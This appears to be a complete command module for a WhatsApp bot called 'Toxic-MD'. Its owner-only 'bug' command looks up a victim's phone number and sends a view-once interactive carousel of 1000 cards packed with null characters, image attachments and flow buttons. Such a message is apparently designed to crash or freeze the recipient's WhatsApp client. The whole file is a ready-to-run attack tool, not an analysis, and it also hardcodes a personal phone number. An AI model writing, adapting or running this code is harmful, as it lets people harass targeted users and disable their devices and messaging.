const { zokou } = require("../framework/zokou");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

zokou(
  {
    nomCom: "bug",
    categorie: "Mods",
    reaction: "💀",
  },
  async (dest, zk, commandeOptions) => {
    const { ms, repondre, arg } = commandeOptions;

    try {
      // Function to normalize phone numbers
      const normalizePhoneNumber = (number) => {
        if (!number) return null;
        let normalized = number.replace(/[^+\d]/g, '');
        if (normalized.match(/^\d/)) {
          normalized = '+' + normalized;
        }
        if (!normalized.match(/^\+\d{10,15}$/)) {
          return null;
        }
        return normalized;
      };

      const senderJid = ms.key.participant || ms.key.remoteJid;
      if (!senderJid) {
        return repondre("𝐄𝐫𝐫𝐨𝐫: 𝐂𝐨𝐮𝐥𝐝 𝐧𝐨𝐭 𝐢𝐝𝐞𝐧𝐭𝐢𝐟𝐲 𝐬𝐞𝐧𝐝𝐞𝐫. 𝐓𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐥𝐚𝐭𝐞𝐫.");
      }

      const senderNumber = normalizePhoneNumber(senderJid.split('@')[0]);
      if (!senderNumber) {
        return repondre("𝐄𝐫𝐫𝐨𝐫: 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐬𝐞𝐧𝐝𝐞𝐫 𝐧𝐮𝐦𝐛𝐞𝐫.");
      }

      const ownerNumber = normalizePhoneNumber("+254735342808");
      if (senderNumber !== ownerNumber) {
        return repondre("𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲! 𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐢𝐬 𝐫𝐞𝐬𝐭𝐫𝐢𝐜𝐭𝐞𝐝 𝐭𝐨 +𝟐𝟓𝟒𝟕𝟑𝟓𝟑𝟒𝟐𝟖𝟎𝟖");
      }

      if (!arg[0]) {
        return repondre("𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐩𝐡𝐨𝐧𝐞 𝐧𝐮𝐦𝐛𝐞𝐫");
      }

      const phoneNumber = normalizePhoneNumber(arg[0]);
      if (!phoneNumber) {
        return repondre("𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫 𝐟𝐨𝐫𝐦𝐚𝐭. 𝐔𝐬𝐞 +𝐂𝐎𝐔𝐍𝐓𝐑𝐘𝐂𝐎𝐃𝐄𝐍𝐔𝐌𝐁𝐄𝐑");
      }

      const [result] = await zk.onWhatsApp(phoneNumber);
      if (!result.exists) {
        return repondre("𝐍𝐮𝐦𝐛𝐞𝐫 𝐧𝐨𝐭 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩: " + phoneNumber);
      }

      const targetJid = result.jid;

      repondre("𝐏𝐫𝐞𝐩𝐚𝐫𝐢𝐧𝐠 𝐜𝐚𝐫𝐨𝐮𝐬𝐞𝐥 𝐟𝐨𝐫 " + phoneNumber + "...");

      // Prepare buttons and cards (same as original)
      let buttons = [];
      for (let i = 0; i < 5; i++) {
        buttons.push({
          name: "galaxy_message",
          buttonParamsJson: JSON.stringify({
            header: "null",
            body: "xxx",
            flow_action: "navigate",
            flow_action_payload: { screen: "FORM_SCREEN" },
            flow_cta: "Grattler",
            flow_id: "1169834181134583",
            flow_message_version: "3",
            flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s",
          }),
        });
      }

      let cards = [];
      for (let i = 0; i < 1000; i++) {
        cards.push({
          body: { text: `\u0000\u0000\u0000\u0000\u0000` },
          footer: { text: "𝐓𝐨𝐱𝐢𝐜-𝐌𝐃 𝐛𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧" },
          header: {
            title: '🍀 𝐓𝐨𝐱𝐢𝐜-𝐌𝐃 𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 \u0000\u0000\u0000\u0000',
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
              fileLength: "591",
              height: 0,
              width: 0,
              mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
              fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
              directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1721344123",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
              scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
              scanLengths: [247, 201, 73, 63],
              midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=",
            },
          },
          nativeFlowMessage: { buttons: buttons },
        });
      }

      const carousel = generateWAMessageFromContent(targetJid, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              body: { text: '\u0000\u0000\u0000\u0000' },
              footer: { text: "𝐓𝐨𝐱𝐢𝐜-𝐌𝐃 𝐛𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧" },
              header: { hasMediaAttachment: false },
              carouselMessage: { cards: cards },
            },
          },
        },
      }, {});

      await zk.relayMessage(targetJid, carousel.message, { messageId: carousel.key.id });

      repondre("𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 𝐬𝐞𝐧𝐭 𝐭𝐨 " + phoneNumber + "!");

    } catch (error) {
      console.error("Error:", error);
      repondre("𝐄𝐫𝐫𝐨𝐫: " + error.message);
    }
  }
);